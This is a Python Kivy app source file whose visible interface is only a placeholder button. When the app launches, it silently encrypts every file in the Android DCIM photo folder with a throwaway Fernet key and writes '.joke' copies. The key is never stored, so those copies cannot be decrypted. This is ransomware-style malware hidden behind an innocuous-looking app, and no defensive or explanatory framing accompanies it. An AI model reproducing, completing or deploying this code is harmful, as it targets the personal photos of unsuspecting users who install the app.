from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from cryptography.fernet import Fernet
import os

class MainApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')

        # Call the main function when the app starts
        self.main()

        label = Button(text="Your Code Goes Here")
        layout.add_widget(label)

        return layout

    def main(self):
        def utpann():
            return Fernet.generate_key()

        def sarvanash(file, key):
            try:
                with open(file, 'rb') as file_raw:
                    data = file_raw.read()

                fernet = Fernet(key)
                encrypted_data = fernet.encrypt(data)

                with open(file + ".joke", 'wb') as file_enc:
                    file_enc.write(encrypted_data)
            except Exception as e:
                print(f"Error encrypting {file}: {e}")

        files = []

        # Replace the directory path with your desired path
        # directory_path = "/root/Pictures"
        directory_path = "/storage/emulated/0/DCIM"
        for file in os.listdir(directory_path):
            file_path = os.path.join(directory_path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        print(files)

        key = utpann()

        for file in files:
            sarvanash(file, key)
            print(file + " encrypted successfully!")

if __name__ == '__main__':
    MainApp().run()
